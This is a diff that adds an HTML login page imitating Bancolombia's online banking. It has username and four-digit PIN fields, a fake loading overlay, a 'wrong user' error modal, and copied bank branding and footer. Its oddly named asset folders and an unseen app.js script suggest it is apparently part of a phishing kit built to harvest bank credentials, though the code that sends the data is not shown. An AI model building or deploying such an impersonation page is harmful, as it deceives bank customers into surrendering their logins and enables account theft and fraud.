@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <link rel="stylesheet" href="stylesbotoco/princi.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bancolombia - Iniciar sesión</title>
+</head>
+<body>
+    <div id="loading-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(255, 255, 255, 0.8); z-index: 9999; justify-content: center; align-items: center;">
+        <img src="a09q298doaknigif.gif" alt="Cargando" style="max-width: 100px; max-height: 100px;">
+    </div>
+    
+    <div id="errorModal" class="modal">
+        <div class="modal-content">
+            <p>Usuario incorrecto. Por favor, intente de nuevo.</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <header>
+            <div style="flex: 1;"></div>
+            <div class="logo-container">
+                <img src="logo-bancolombia+(1).png" alt="Bancolombia logo" class="logo">
+            </div>
+            <div style="flex: 1; display: flex; justify-content: flex-end;">
+                <button class="exit-button">Salir</button>
+            </div>
+        </header>
+
+        <main>
+            <div class="login-container">
+                <h1>Te damos la bienvenida</h1>
+            </div>
+
+            <div class="login-form">
+                <p class="info-text">
+                    El usuario es el mismo con el que ingresas a la<br>
+                    <strong>Sucursal Virtual Personas.</strong>
+                </p>
+                
+                <div id="error-message" class="error-message" style="display: none;">Los datos ingresados no coinciden. Inténtalo nuevamente</div>
+
+                <div class="input-group">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                        <circle cx="12" cy="7" r="4"></circle>
+                    </svg>
+                    <input type="text" id="username" placeholder="Usuario">
+                </div>
+
+                <div class="input-group">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                    </svg>
+                    <input type="password" id="password" placeholder="Contraseña" maxlength="4" inputmode="numeric" pattern="\d{4}">
+                    <a href="#" class="forgot-link">¿Olvidaste tu contraseña?</a>
+                </div>
+                
+                <div class="button-group">
+                    <button class="button button-outline">Volver</button>
+                    <button id="continueButton" class="button button-primary" disabled>Continuar</button>
+                </div>
+            </div>
+        </main>
+
+        <div class="image-below-buttons">
+            <img src="fondo-removebg-preview.png" alt="Imagen Bancolombia">
+        </div>
+
+        <footer>
+            <div class="footer-content">
+                <div class="logo-container-footer">
+                </div>
+                <img src="superinter.png" alt="Superintendencia Financiera" class="superintendencia-logo">
+                <p class="superintendencia-text">
+                    Vigilado Superintendencia Financiera de Colombia
+                </p>
+                <div class="footer-info">
+                    <p>Avenida Calle 100 # 7 – 33 Torre 2, Piso 8 en Bogotá.</p>
+                    <div class="footer-links">
+                        <a href="#">Términos y condiciones</a> | <a href="#">Política de privacidad</a>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+    <script src="scriptbotoco/app.js"></script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"45ecc24fed1a4db0b1414a514a0d3418","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
